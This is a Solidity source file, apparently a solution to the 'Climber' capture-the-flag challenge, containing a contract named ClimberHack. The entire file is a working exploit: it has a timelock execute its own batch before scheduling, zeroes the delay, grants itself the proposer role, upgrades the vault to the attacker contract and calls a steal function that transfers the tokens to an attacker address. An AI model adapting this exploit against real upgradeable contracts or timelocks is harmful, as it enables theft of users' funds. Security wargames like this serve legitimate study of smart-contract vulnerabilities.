// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IVault {
    function initialize(
        address admin,
        address proposer,
        address sweeper
    ) external;

    function sweepFunds(address tokenAddress) external;
}

interface ITimeLock {
    function execute(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external;

    function PROPOSER_ROLE() external returns (bytes32);

    function schedule(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external;
}

contract ClimberHack is Initializable, OwnableUpgradeable, UUPSUpgradeable {
    uint256 public constant WITHDRAWAL_LIMIT = 1 ether;
    uint256 public constant WAITING_PERIOD = 15 days;

    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;
    bytes32 private constant SALT = "pwn";
    address[] internal targets;
    uint256[] internal values;
    bytes[] internal dataElements;

    function attack(
        ITimeLock _timelock,
        IVault _vault,
        IERC20 _token,
        address _attacker
    ) external {
        targets.push(address(_timelock));
        targets.push(address(_timelock));
        targets.push(address(this));
        targets.push(address(_vault));

        values.push(0);
        values.push(0);
        values.push(0);
        values.push(0);

        dataElements.push(abi.encodeWithSignature("updateDelay(uint64)", 0));
        dataElements.push(
            abi.encodeWithSignature(
                "grantRole(bytes32,address)",
                _timelock.PROPOSER_ROLE(),
                address(this)
            )
        );
        dataElements.push(
            abi.encodeWithSignature("propose(address)", address(_timelock))
        );
        dataElements.push(
            abi.encodeWithSignature(
                "upgradeToAndCall(address,bytes)",
                address(this),
                abi.encodeWithSignature(
                    "steal(address,address)",
                    address(_token),
                    _attacker
                )
            )
        );

        _timelock.execute(targets, values, dataElements, SALT);
    }

    function steal(IERC20 _token, address _attacker) external {
        _token.transfer(_attacker, 10000000 ether);
    }

    function propose(address _timelock) external {
        ITimeLock(_timelock).schedule(targets, values, dataElements, SALT);
    }

    // By marking this internal function with `onlyOwner`, we only allow the owner account to authorize an upgrade
    function _authorizeUpgrade(address newImplementation)
        internal
        override
        onlyOwner
    {}
}
